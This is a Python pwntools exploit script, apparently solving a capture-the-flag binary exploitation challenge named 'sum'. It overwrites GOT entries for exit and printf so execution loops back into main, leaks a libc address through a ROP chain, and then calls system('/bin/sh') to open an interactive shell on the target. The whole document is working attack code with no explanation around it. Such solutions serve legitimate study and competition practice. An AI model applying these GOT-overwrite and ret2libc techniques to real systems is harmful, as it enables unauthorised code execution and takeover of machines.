#!/usr/bin/env python3

from pwn import *

exe = ELF("./sum")
libc = ELF("./libc.so")
ld = ELF("./ld-2.27.so")

context.binary = exe


def conn():
    if args.LOCAL:
        return process([ld.path, exe.path], env={"LD_PRELOAD": libc.path})
    else:
        return remote("addr", 1337)


def main():
    r = conn()

    main_start = 0x00400903

    # set exit() to always redirect us to beginning of main()
    r.sendline("1 " * 4 + str(main_start - exe.got['exit'] - 4) + " " + str(exe.got['exit']))

    # pop puts@got into rdi, call puts@plt, call exit@plt - leak libc address
    pop_rdi = 0x0000000000400a43

    r.sendline("1 " * 4 + str(pop_rdi - exe.got['printf'] - 4) + " " + str(exe.got['printf']))
    r.sendline(str(pop_rdi) + " " + str(exe.got['puts']) + " " +  str(exe.symbols['puts']) + " " +  str(exe.symbols['exit']) + " 0")
    
    [r.recvuntil("2 3 4 0\n") for i in range(3)]
    leak = u64(r.recvn(6) + "\x00\x00")
    libc.address = leak - libc.symbols['puts']

    #gdb.attach(r, gdbscript = 'b *0x004009bf')
    r.sendline(str(pop_rdi) + " " + str(next(libc.search('/bin/sh\x00'))) + " " + str(libc.symbols['system']) + " 0")

    r.interactive()


if __name__ == "__main__":
    main()
